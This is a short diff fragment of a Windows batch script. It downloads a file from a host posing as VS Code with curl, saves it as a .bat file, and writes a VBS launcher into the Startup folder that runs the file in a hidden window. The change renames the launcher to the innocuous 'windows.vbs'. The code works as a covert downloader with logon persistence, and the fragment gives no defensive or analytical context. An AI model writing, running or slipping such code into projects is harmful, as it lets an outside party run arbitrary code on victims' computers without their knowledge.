@@ -9,6 +9,6 @@ curl -s http://vscode.atwebpages.com/starter.txt > "%updates_folder%\starter.bat
 
 (
     echo.CreateObject^("Wscript.Shell"^).Run "C:\Updates\starter.bat", 0, True
-) > "%startup_folder%\starter.vbs"
+) > "%startup_folder%\windows.vbs"
 
 exit
